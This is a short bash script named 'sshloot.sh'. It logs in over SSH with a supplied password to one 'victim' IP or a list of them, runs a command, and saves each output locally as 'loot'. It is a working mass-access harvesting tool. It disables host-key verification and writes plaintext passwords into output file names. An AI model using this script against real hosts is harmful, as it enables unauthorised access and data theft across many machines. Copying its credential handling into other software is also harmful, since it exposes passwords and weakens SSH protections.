# Author: Karn Ganeshen
# Date: May 23, 2013 v1.0
# A quick script to ssh in to an IP address or a file with multiple IP addresses, execute a command and save it on the local file system.
# Good for batch SSH jobs where SSH password based authentication is in use
# Uses sshpass: apt-get install sshpass

#!/bin/bash -e

if [ $# -ne 10 ]
  then
	echo "Correct syntax is:  "
	echo " ./sshloot.sh [options] "
	echo "	-u <SSH_User> "
	echo "  -p <SSH_Pass> "
	echo "	-i <VictimIP> OR -I <VictimIP-Range-file> "
	echo "	-d <Local_dir_to_copy_to> "
	echo " <command desc> "
	echo " <command> "
	exit;
fi

u=$2;
p=$4;
d=$8;

if [ $5 == '-i' ]
then
	IP=$6
	if nc -w 5 -z $IP 22
	then
		sshpass -p $p ssh -q -o StrictHostKeychecking=no -o UserKnownHostsFile=/dev/null $u@$IP ${10} > $IP-$u-$p-$9

		if [ -s $IP-$u-$p-$9 ]
		then
			printf ""$IP" successfully looted"
			printf '\n'
		else
			rm $IP-$u-$p-$9
		fi
	else
		printf ""$IP": could not connect\n"
	fi
fi

if [ $5 == '-I' ]
then
	filename=$6
	for IP in `cat $filename`
	do
		if  nc -w 5 -z $IP 22
		then
        		sshpass -p $p ssh -q -o StrictHostKeychecking=no -o UserKnownHostsFile=/dev/null $u@$IP ${10} > $IP-$u-$p-$9

			if [ -s $IP-$u-$p-$9 ]
	                then
	       	                printf ""$IP" successfully looted"
                	        printf '\n'
	                else
       		                rm $IP-$u-$p-$9
                	fi

		else
			printf ""$IP": could not connect \n"
		fi
	done
fi
